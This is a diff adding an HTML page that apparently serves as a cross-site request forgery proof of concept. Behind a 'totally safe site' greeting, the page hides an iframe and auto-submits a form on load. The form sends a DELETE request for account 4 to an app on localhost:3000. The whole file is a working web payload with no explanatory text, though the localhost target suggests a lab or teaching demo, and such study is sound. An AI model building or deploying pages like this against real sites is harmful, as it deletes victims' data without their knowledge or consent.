@@ -1,0 +1,12 @@
+<html>
+<head>
+</head>
+<body>
+Hello and welcome to my totally safe site.
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://localhost:3000/accounts/4' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='_method' value='delete'>
+  <input type='submit' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+</body>
